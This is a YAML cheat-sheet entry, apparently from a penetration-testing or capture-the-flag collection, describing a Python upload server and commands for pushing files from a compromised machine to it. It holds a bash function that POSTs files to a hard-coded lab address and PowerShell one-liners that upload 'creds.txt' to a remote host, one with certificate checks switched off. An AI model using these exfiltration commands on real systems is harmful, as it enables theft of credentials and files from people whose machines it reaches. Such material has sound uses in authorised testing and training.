---
functions:
  file-transfer:
    - description: This python script will handle file uploads and supports POST requests
      code: |
        usage: http-server.py [-h] [-p PORT] [-l LISTEN] [-n]

        A Better Python3 HTTP Server

        optional arguments:
          -h, --help            show this help message and exit
          -p PORT, --port PORT  the port for the http service to listen on
          -l LISTEN, --listen LISTEN
                                the interface to bind to
          -n, --no-ssl          do not serve https / ssl

        UPLOAD:
          Start the Server - python3 http-server.py
          Pick your method:

          - - - curl - - - 
          curl -k -i -X POST -F 'filename=@<filename>' -F 'name=file' http(s)://<ip>:<port>
          
          TIP - cp paste this function and run "get <file>"

        get(){
        file=$1
        ip="10.10.14.8"
        port="8080"
        #echo $file $ip $port
        output=$(curl -k -i -X POST -F filename=@"$file" -F name=file "http://$ip:$port")
        if [[ "$output" == *"success"* ]]; then
          echo "[+] Uploaded! --> $file"
        else
          echo "[-] Upload Failed! --> $file $ip:$port"
        fi
        }

          - - - powershell - - - 
          powershell -c (New-Object System.Net.WebClient).UploadFile('http://<ip>:<port>', 'creds.txt')
          powershell -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(New-Object System.Net.WebClient).UploadFile('https://10.0.0.4:8000', 'creds.txt')
          (3) manually browsing to the ip and port
          (4) profit!
resources: |
  https://raw.githubusercontent.com/MidnightSeer/scripts/master/http-server.py

---
